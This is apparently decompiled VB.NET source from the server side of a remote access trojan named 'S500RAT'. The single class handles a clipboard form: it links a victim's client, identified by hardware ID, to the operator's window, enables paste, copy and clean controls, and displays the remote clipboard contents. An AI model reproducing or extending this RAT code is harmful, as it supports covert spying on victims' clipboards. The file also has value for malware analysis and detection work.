Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000045 RID: 69
	Public Class FrmClipboard
		' Token: 0x0600117F RID: 4479 RVA: 0x00097938 File Offset: 0x00095B38
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim formClipboard As FormClipboard = CType(Application.OpenForms("FormClipboard" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormClipboard)
				Dim flag As Boolean = formClipboard IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formClipboard.Client Is Nothing
					If flag2 Then
						formClipboard.Client = client
						formClipboard.Timer1.Enabled = True
						formClipboard.Paste.Enabled = True
						formClipboard.Copy.Enabled = True
						formClipboard.Clean.Enabled = True
						formClipboard.T1.Enabled = True
					End If
					formClipboard.T1.Text = unpack_msgpack.ForcePathObject("Paste").AsString
				End If
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
